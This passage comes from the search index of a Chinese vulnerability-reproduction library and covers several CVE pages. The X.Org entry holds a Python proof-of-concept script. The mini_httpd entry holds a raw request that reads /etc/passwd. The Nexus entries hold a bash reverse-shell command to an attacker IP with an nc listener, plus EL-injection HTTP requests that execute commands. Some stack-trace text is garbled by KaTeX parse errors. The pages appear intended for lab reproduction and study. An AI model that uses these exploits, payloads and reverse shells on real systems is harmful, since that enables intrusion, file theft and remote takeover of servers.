\u53d1\u884c\u7248\u548cUnix\u7cfb\u7edf\u7684\u57fa\u7840\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f\uff0c\u662f\u7cfb\u7edf\u6807\u914d\u3002\u800c\u6b64\u7a0b\u5e8f\u4e5f\u662f\u4ee5Root\u6743\u9650\u542f\u52a8\u7684\uff0c\u56e0\u800c\u6210\u529f\u6ea2\u51fa\u5b83\u800c\u83b7\u5f97\u7684 shell \uff0c\u4e5f\u662froot\u6743\u9650\u3002 0x2 \u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f # \u65f6\u95f4: 2019-10-16 # \u4f5c\u8005: Marcelo V\u00e1zquez (s4vitar) # \u5382\u5546: https://www.x.org/ # \u7248\u672c: <= 1.20.4 # \u6d4b\u8bd5\u5e73\u53f0: Linux # CVE: CVE-2019-17624 0x3 POC #!/usr/bin/python #coding: utf-8 # ************************************************************************ # * Author: Marcelo V\u00e1zquez (aka s4vitar) * # * X.Org X Server 1.20.4 / X Protocol Version 11 (Stack Overflow) * # ************************************************************************ import sys , time import ctypes as ct from ctypes import cast from ctypes.util import find_library def access_violation ( x11 , current_display ): keyboard = ( ct . c_char * 1000 )() x11 . XQueryKeymap ( current_display , keyboard ) if __name__ == '__main__' : print \" \\n [*] Loading x11... \\n \" time . sleep ( 2 ) x11 = ct . cdll . LoadLibrary ( find_library ( \"X11\" )) current_display = x11 . XOpenDisplay ( None ) print \"[*] Exploiting... \\n \" time . sleep ( 1 ) try : access_violation ( x11 , current_display ) except : print \" \\n Error... \\n \" sys . exit ( 1 )","title":"CVE-2019-17624-X.Org X Server 1.20.4 - Local Stack Overflow-Linux\u56fe\u5f62\u754c\u9762X Server\u672c\u5730\u6808\u6ea2\u51faPOC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/","text":"\u524d\u8a00 \u00b6 Mini_httpd\u662f\u4e00\u4e2a\u5fae\u578b\u7684Http\u670d\u52a1\u5668\uff0c\u5728\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4fdd\u6301\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6027\u80fd\uff08\u7ea6\u4e3aApache\u768490%\uff09\uff0c\u56e0\u6b64\u5e7f\u6cdb\u88ab\u5404\u7c7bIOT\uff08\u8def\u7531\u5668\uff0c\u4ea4\u6362\u5668\uff0c\u6444\u50cf\u5934\u7b49\uff09\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u670d\u52a1\u5668\u3002\u800c\u5305\u62ec\u534e\u4e3a\uff0czyxel\uff0c\u6d77\u5eb7\u5a01\u89c6\uff0c\u6811\u8393\u6d3e\u7b49\u5728\u5185\u7684\u5382\u5546\u7684\u65d7\u4e0b\u8bbe\u5907\u90fd\u66fe\u91c7\u7528Mini_httpd\u7ec4\u4ef6\u3002 \u5f71\u54cd\u7248\u672c \u00b6 ACME mini_httpd before 1.30 \u6f0f\u6d1e\u5206\u6790 \u00b6 \u5728mini_httpd\u5f00\u542f\u865a\u62df\u4e3b\u673a\u6a21\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u8bf7\u6c42http://HOST/FILE\u5c06\u4f1a\u8bbf\u95ee\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\u7684HOST/FILE\u6587\u4ef6\u3002 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); \u89c1\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5206\u6790\u5982\u4e0b\uff1a \u5f53HOST=example.com\u3001FILE=index.html\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3aexample.com/index.html\uff0c\u6587\u4ef6\u6b63\u5e38\u8bfb\u53d6\u3002 \u5f53HOST\u4e3a\u7a7a\u3001FILE=etc/passwd\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3a/etc/passwd\u3002 \u540e\u8005\u88ab\u4f5c\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u4e8e\u662f\u8bfb\u53d6\u5230\u4e86/etc/passwd\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u3002 \u73af\u5883\u642d\u5efa``` cd vulhub/mini_httpd/CVE-2018-18778 docker-compose up -d \u542f\u52a8mini_httpd 1.29\uff1a \u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Web\u9875\u9762\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u53d1\u9001\u8bf7\u6c42\u662f\u5c06Host\u7f6e\u7a7a\uff0cPATH\u7684\u503c\u662f\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\uff1a``` GET /etc/passwd HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close","title":"mini_httpd\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff08CVE-2018-18778\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_1","text":"Mini_httpd\u662f\u4e00\u4e2a\u5fae\u578b\u7684Http\u670d\u52a1\u5668\uff0c\u5728\u5360\u7528\u7cfb\u7edf\u8d44\u6e90\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4fdd\u6301\u4e00\u5b9a\u7a0b\u5ea6\u7684\u6027\u80fd\uff08\u7ea6\u4e3aApache\u768490%\uff09\uff0c\u56e0\u6b64\u5e7f\u6cdb\u88ab\u5404\u7c7bIOT\uff08\u8def\u7531\u5668\uff0c\u4ea4\u6362\u5668\uff0c\u6444\u50cf\u5934\u7b49\uff09\u4f5c\u4e3a\u5d4c\u5165\u5f0f\u670d\u52a1\u5668\u3002\u800c\u5305\u62ec\u534e\u4e3a\uff0czyxel\uff0c\u6d77\u5eb7\u5a01\u89c6\uff0c\u6811\u8393\u6d3e\u7b49\u5728\u5185\u7684\u5382\u5546\u7684\u65d7\u4e0b\u8bbe\u5907\u90fd\u66fe\u91c7\u7528Mini_httpd\u7ec4\u4ef6\u3002","title":"\u524d\u8a00"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_2","text":"ACME mini_httpd before 1.30","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_3","text":"\u5728mini_httpd\u5f00\u542f\u865a\u62df\u4e3b\u673a\u6a21\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u8bf7\u6c42http://HOST/FILE\u5c06\u4f1a\u8bbf\u95ee\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\u7684HOST/FILE\u6587\u4ef6\u3002 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); \u89c1\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5206\u6790\u5982\u4e0b\uff1a \u5f53HOST=example.com\u3001FILE=index.html\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3aexample.com/index.html\uff0c\u6587\u4ef6\u6b63\u5e38\u8bfb\u53d6\u3002 \u5f53HOST\u4e3a\u7a7a\u3001FILE=etc/passwd\u7684\u65f6\u5019\uff0c\u4e0a\u8ff0\u8bed\u53e5\u7ed3\u679c\u4e3a/etc/passwd\u3002 \u540e\u8005\u88ab\u4f5c\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u4e8e\u662f\u8bfb\u53d6\u5230\u4e86/etc/passwd\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u3002 \u73af\u5883\u642d\u5efa``` cd vulhub/mini_httpd/CVE-2018-18778 docker-compose up -d \u542f\u52a8mini_httpd 1.29\uff1a \u73af\u5883\u542f\u52a8\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Web\u9875\u9762\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/mini_httpd/mini_httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-18778%EF%BC%89/#_4","text":"\u53d1\u9001\u8bf7\u6c42\u662f\u5c06Host\u7f6e\u7a7a\uff0cPATH\u7684\u503c\u662f\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84\uff1a``` GET /etc/passwd HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/","text":"\u5f71\u54cd\u7248\u672c \u00b6 Nexus Repository Manager OSS/Pro 3.6.2 \u7248\u672c\u5230 3.14.0 \u7248\u672c Nexus Repository Manager 3 \u662f\u4e00\u6b3e\u8f6f\u4ef6\u4ed3\u5e93\uff0c\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u548c\u5206\u53d1Maven\u3001NuGET\u7b49\u8f6f\u4ef6\u6e90\u4ed3\u5e93\u3002\u51763.14.0\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u57fa\u4e8eOrientDB\u81ea\u5b9a\u4e49\u51fd\u6570\u7684\u4efb\u610fJEXL\u8868\u8fbe\u5f0f\u6267\u884c\u529f\u80fd\uff0c\u800c\u8fd9\u5904\u529f\u80fd\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u5c06\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002 \u6f0f\u6d1e\u6210\u56e0 \u00b6 ###\u7531\u4e8e\u672a\u6388\u6743\u8bbf\u95ee\u7684\u7528\u6237\u53ef\u4ee5\u6784\u9020\u8bf7\u6c42\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\uff0c\u89e6\u53d1\u6d41\u7a0b\u5982\u4e0b\uff1a ExtDirectModuleKaTeX parse error: Expected 'EOF', got '#' at position 14: configure:60 #\u0332 \u8def\u7531\u7ed1\u5b9a\u4e0e\u8bf7\u6c42\u89e3\u6790 ExtD\u2026doPost:155 # \u5904\u7406post\u8bf7\u6c42 DirectJNgineServletKaTeX parse error: Expected 'EOF', got '#' at position 12: doPost:595 #\u0332 \u6839\u636e\u4e0d\u540c\u7684Content-T\u2026processRequest:632 # \u89e3\u6790json\u8bf7\u6c42 JsonRequestProcesorKaTeX parse error: Expected 'EOF', got '#' at position 13: process:119 #\u0332 \u89e3\u6790json\u8bed\u6cd5\u6811 Json\u2026getIndividualJsonRequests:216 # \u63d0\u53d6json\u6570\u636e JsonRequestProcesorKaTeX parse error: Expected 'EOF', got '#' at position 13: process:133 #\u0332 \u6784\u9020\u8fd4\u56de\u7ed3\u6784 Compone\u2026previewAssets:188 # \u89e3\u6790post\u5305\u4e2d\u7684data\u6570\u636e\u5e76\u6784\u9020\u67e5\u8be2\u8bed\u53e5\u67e5\u8be2\u5305 ComponentComponentKaTeX parse error: Expected 'EOF', got '#' at position 19: \u2026viewAssets:208 #\u0332 \u83b7\u5f97\u67e5\u8be2\u7ed3\u679c BrowseS\u2026previewAssets:252 # \u6784\u5efaOrientDb\u67e5\u8be2\u8bed\u53e5 BrowseServiceImplKaTeX parse error: Expected 'EOF', got '#' at position 19: \u2026viewAssets:258 #\u0332 \u62fc\u63a5\u67e5\u8be2\u8bed\u53e5 BrowseS\u2026previewAssets:262 # \u6267\u884c\u67e5\u8be2 MetadataNodeEntityAdapterKaTeX parse error: Expected 'EOF', got '#' at position 18: \u2026untByQuery:221 #\u0332 \u6267\u884cOrientDb\u67e5\u8be2\u8bed\u53e5\u2026execute:125 # \u63d0\u53d6jexl\u8868\u8fbe\u5f0f ContextExpressionFunction$checkJexlExpression:15 \u4fee\u590d\u65b9\u6cd5 \u00b6 \u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u6539\u4e86\u8be5\u6f0f\u6d1e\uff0c\u5efa\u8bae\u60a8\u53c2\u7167\u4e0a\u8ff0\u3010\u5b89\u5168\u7248\u672c\u3011\u5347\u7ea7\u5230\u5bf9\u5e94\u7684\u6700\u65b0\u7248\u672c\u3002 \u6700\u65b0\u7248\u672c\u4e0b\u8f7d\u94fe\u63a5\uff1a https://help.sonatype.com/repomanager3/download \u73af\u5883\u642d\u5efa \u00b6 1.\u5728centos 7 \u4e0a\u5b89\u88c5docker\u548cdocker-compose (1).\u5b89\u88c5PIP curl -s https://bootstrap.pypa.io/get-pip.py | python3 (2).\u5b89\u88c5docker curl -s https://get.docker.com/ | sh (3).\u542f\u52a8docker\u670d\u52a1 service docker start 123456 (4).\u5b89\u88c5docker compose pip install docker-compose 12 2.\u4f7f\u7528\u65b9\u6cd5 (1).\u4e0b\u8f7d\u6f0f\u6d1e\u73af\u5883\u9879\u76ee git clone https://github.com/vulhub/vulhub.git (2).\u8fdb\u5165\u5230nexus\u5229\u7528\u73af\u5883 cd vulhub/nexus/CVE-2019-7238 (3).\u7f16\u8bd1\u73af\u5883 docker-compose build 123456 (4).\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8Nexus Repository Manager 3.14.0 docker-compose build 12 \u6f0f\u6d1e\u590d\u73b0 \u00b6 1.\u8fdb\u5165\u5230CVE-2019-7238\u76ee\u5f55 cd CVE-2019-7238 2.\u4fee\u6539cve-2019-7238.py.\u8fd9\u91cc\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6765\u4fee\u6539remote = \u2018 http://192.168.1.144:8081 \uff08\u5b58\u5728\u6f0f\u6d1e\u7684\u4e3b\u673aip\u5730\u5740\uff09\u2018\u548c ARCH = \u201c LINUX \u201d\u7684\u503c\uff0c\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95eehttp://192.168.1.144:8081,\u5982\u4e0b\u56fe\u6240\u793a\uff1a 3.\u5728\u653b\u51fb\u8005\u7cfb\u7edf\u4e2d\u6267\u884ccve-2019-7238.py\u811a\u672c\uff0c\u7136\u540e\u8f93\u5165\u53cd\u5f39NC\u7684bash\uff08\u6b64\u5904\u7684IP\u5730\u5740\u662f\u653b\u51fb\u8005\u7684ip\u5730\u5740\uff0c\u5373192.168.1.165\uff0c\u7aef\u53e3\u4efb\u610f\uff09 bash -i >& /dev/tcp/192.168.1.165/2333 0>&1 4.\u5728\u653b\u51fb\u8005\u7cfb\u7edf\u4e2d\u6267\u884cNC\u76d1\u542c\u53cd\u5f39\uff08\u5728\u653b\u51fb\u673a\u4e0a\u6267\u884c\u53cd\u5f39shell\uff0c\u5373\u5728192.168.1.165\u673a\u5668\u4e0a\uff09 nc -lvvp 2333 #\u53c2\u8003\u94fe\u63a5\uff1a","title":"Nexus Repository Manager 3 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2019-7238"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_1","text":"Nexus Repository Manager OSS/Pro 3.6.2 \u7248\u672c\u5230 3.14.0 \u7248\u672c Nexus Repository Manager 3 \u662f\u4e00\u6b3e\u8f6f\u4ef6\u4ed3\u5e93\uff0c\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u548c\u5206\u53d1Maven\u3001NuGET\u7b49\u8f6f\u4ef6\u6e90\u4ed3\u5e93\u3002\u51763.14.0\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u57fa\u4e8eOrientDB\u81ea\u5b9a\u4e49\u51fd\u6570\u7684\u4efb\u610fJEXL\u8868\u8fbe\u5f0f\u6267\u884c\u529f\u80fd\uff0c\u800c\u8fd9\u5904\u529f\u80fd\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u5c06\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_2","text":"###\u7531\u4e8e\u672a\u6388\u6743\u8bbf\u95ee\u7684\u7528\u6237\u53ef\u4ee5\u6784\u9020\u8bf7\u6c42\u800c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\uff0c\u89e6\u53d1\u6d41\u7a0b\u5982\u4e0b\uff1a ExtDirectModuleKaTeX parse error: Expected 'EOF', got '#' at position 14: configure:60 #\u0332 \u8def\u7531\u7ed1\u5b9a\u4e0e\u8bf7\u6c42\u89e3\u6790 ExtD\u2026doPost:155 # \u5904\u7406post\u8bf7\u6c42 DirectJNgineServletKaTeX parse error: Expected 'EOF', got '#' at position 12: doPost:595 #\u0332 \u6839\u636e\u4e0d\u540c\u7684Content-T\u2026processRequest:632 # \u89e3\u6790json\u8bf7\u6c42 JsonRequestProcesorKaTeX parse error: Expected 'EOF', got '#' at position 13: process:119 #\u0332 \u89e3\u6790json\u8bed\u6cd5\u6811 Json\u2026getIndividualJsonRequests:216 # \u63d0\u53d6json\u6570\u636e JsonRequestProcesorKaTeX parse error: Expected 'EOF', got '#' at position 13: process:133 #\u0332 \u6784\u9020\u8fd4\u56de\u7ed3\u6784 Compone\u2026previewAssets:188 # \u89e3\u6790post\u5305\u4e2d\u7684data\u6570\u636e\u5e76\u6784\u9020\u67e5\u8be2\u8bed\u53e5\u67e5\u8be2\u5305 ComponentComponentKaTeX parse error: Expected 'EOF', got '#' at position 19: \u2026viewAssets:208 #\u0332 \u83b7\u5f97\u67e5\u8be2\u7ed3\u679c BrowseS\u2026previewAssets:252 # \u6784\u5efaOrientDb\u67e5\u8be2\u8bed\u53e5 BrowseServiceImplKaTeX parse error: Expected 'EOF', got '#' at position 19: \u2026viewAssets:258 #\u0332 \u62fc\u63a5\u67e5\u8be2\u8bed\u53e5 BrowseS\u2026previewAssets:262 # \u6267\u884c\u67e5\u8be2 MetadataNodeEntityAdapterKaTeX parse error: Expected 'EOF', got '#' at position 18: \u2026untByQuery:221 #\u0332 \u6267\u884cOrientDb\u67e5\u8be2\u8bed\u53e5\u2026execute:125 # \u63d0\u53d6jexl\u8868\u8fbe\u5f0f ContextExpressionFunction$checkJexlExpression:15","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_3","text":"\u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u6539\u4e86\u8be5\u6f0f\u6d1e\uff0c\u5efa\u8bae\u60a8\u53c2\u7167\u4e0a\u8ff0\u3010\u5b89\u5168\u7248\u672c\u3011\u5347\u7ea7\u5230\u5bf9\u5e94\u7684\u6700\u65b0\u7248\u672c\u3002 \u6700\u65b0\u7248\u672c\u4e0b\u8f7d\u94fe\u63a5\uff1a https://help.sonatype.com/repomanager3/download","title":"\u4fee\u590d\u65b9\u6cd5"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_4","text":"1.\u5728centos 7 \u4e0a\u5b89\u88c5docker\u548cdocker-compose (1).\u5b89\u88c5PIP curl -s https://bootstrap.pypa.io/get-pip.py | python3 (2).\u5b89\u88c5docker curl -s https://get.docker.com/ | sh (3).\u542f\u52a8docker\u670d\u52a1 service docker start 123456 (4).\u5b89\u88c5docker compose pip install docker-compose 12 2.\u4f7f\u7528\u65b9\u6cd5 (1).\u4e0b\u8f7d\u6f0f\u6d1e\u73af\u5883\u9879\u76ee git clone https://github.com/vulhub/vulhub.git (2).\u8fdb\u5165\u5230nexus\u5229\u7528\u73af\u5883 cd vulhub/nexus/CVE-2019-7238 (3).\u7f16\u8bd1\u73af\u5883 docker-compose build 123456 (4).\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8Nexus Repository Manager 3.14.0 docker-compose build 12","title":"\u73af\u5883\u642d\u5efa"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2019-7238/#_5","text":"1.\u8fdb\u5165\u5230CVE-2019-7238\u76ee\u5f55 cd CVE-2019-7238 2.\u4fee\u6539cve-2019-7238.py.\u8fd9\u91cc\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6765\u4fee\u6539remote = \u2018 http://192.168.1.144:8081 \uff08\u5b58\u5728\u6f0f\u6d1e\u7684\u4e3b\u673aip\u5730\u5740\uff09\u2018\u548c ARCH = \u201c LINUX \u201d\u7684\u503c\uff0c\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95eehttp://192.168.1.144:8081,\u5982\u4e0b\u56fe\u6240\u793a\uff1a 3.\u5728\u653b\u51fb\u8005\u7cfb\u7edf\u4e2d\u6267\u884ccve-2019-7238.py\u811a\u672c\uff0c\u7136\u540e\u8f93\u5165\u53cd\u5f39NC\u7684bash\uff08\u6b64\u5904\u7684IP\u5730\u5740\u662f\u653b\u51fb\u8005\u7684ip\u5730\u5740\uff0c\u5373192.168.1.165\uff0c\u7aef\u53e3\u4efb\u610f\uff09 bash -i >& /dev/tcp/192.168.1.165/2333 0>&1 4.\u5728\u653b\u51fb\u8005\u7cfb\u7edf\u4e2d\u6267\u884cNC\u76d1\u542c\u53cd\u5f39\uff08\u5728\u653b\u51fb\u673a\u4e0a\u6267\u884c\u53cd\u5f39shell\uff0c\u5373\u5728192.168.1.165\u673a\u5668\u4e0a\uff09 nc -lvvp 2333 #\u53c2\u8003\u94fe\u63a5\uff1a","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/nexus/nexus%20oss%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28cve-2020-10199%20%26%26%2010204%29/","text":"nexus repository oss \u00b6 Nexus Repository OSS 3\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u4ed3\u5e93\u7ba1\u7406\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u66f4\u52a0\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u800c\u4e14\u5b89\u88c5\u3001\u914d\u7f6e\u3001\u4f7f\u7528\u8d77\u6765\u4e5f\u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\u3002OSS 3\u7248\u672c\u4e3b\u8981\u652f\u6301\u7684\u4ed3\u5e93\uff08Repository\uff09\u5305\u62ec\u5982\u4e0b\uff1a bower\u3001docker\u3001maven\u3001npm\u3001nuget\u3001pypi\u3001raw\u3001rubygems\u3001yum \u6f0f\u6d1e\u8be6\u60c5 \u00b6 10199\u7684\u6f0f\u6d1e\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef\u89e6\u53d1\uff0c\u800c10204\u5219\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e24\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u539f\u56e0\u5747\u662f\u4e0d\u5b89\u5168\u7684\u6267\u884cEL\u8868\u8fbe\u5f0f\u5bfc\u81f4\u7684 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u542f\u52a8\u6f0f\u6d1e\u73af\u5883 docker run -it -p 8081:8081 -d co0ontty/cve-2020-10199 \u67e5\u770b\u7528\u6237\u540d\u5bc6\u7801 \u67e5\u770b DOCKER CONTAINER ID docker ps \u67e5\u770b\u5bc6\u7801 \u5176\u4e2d bc91335e3518 \u4e3a DOCKER CONTAINER ID docker exec -it bc91335e3518 cat /root/sonatype-work/nexus3/admin.password \u8bbf\u95ee http://ip:8081 cve-2020-10199 \u00b6 \u547d\u4ee4\u6267\u884c\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 372 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close {\"action\":\"cleanup_CleanupPolicy\",\"method\":\"create\",\"data\":[{\"name\":\"co0ontty\",\"format\":\"$\\.{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /opt/cve-2020-10199')}\",\"notes\":\"222\",\"mode\":\"delete\",\"lastBlobUpdatedEnabled\":false,\"lastDownloadedEnabled\":false,\"releaseTypeEnabled\":false,\"regexEnabled\":false,\"criteria\":{}}],\"type\":\"rpc\",\"tid\":33} ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/nexus-10199-1.png) \u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a POST /service/rest/beta/repositories/apt/hosted HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 358 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close { \"name\": \"interna1l\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true, \"writePolicy\": \"allow_once\" }, \"cleanup\": { \"policyNames\": [\"co0ontty\"] }, \"apt\": { \"distribution\": \"bionic\" }, \"aptSigning\": { \"keypair\": \"string\", \"passphrase\": \"string\" } } ``` cve-2020-10204 \u00b6 \u547d\u4ee4\u6267\u884c\u4e00\uff1a``` POST /service/extdirect HTTP/1.1 Host: 192.168.232.128:8081 Content-Length: 362 X-Requested-With: XMLHttpRequest X-Nexus-UI: true User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.31170964063400564 Content-Type: application/json Accept: / Origin: http://192.168.232.128:8081 Referer: http://192.168.232.128:8081/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: NX-ANTI-CSRF-TOKEN=0.31170964063400564; NXSESSIONID=77c0418f-6c70-430c-8c20-222908bbe861 Connection: close 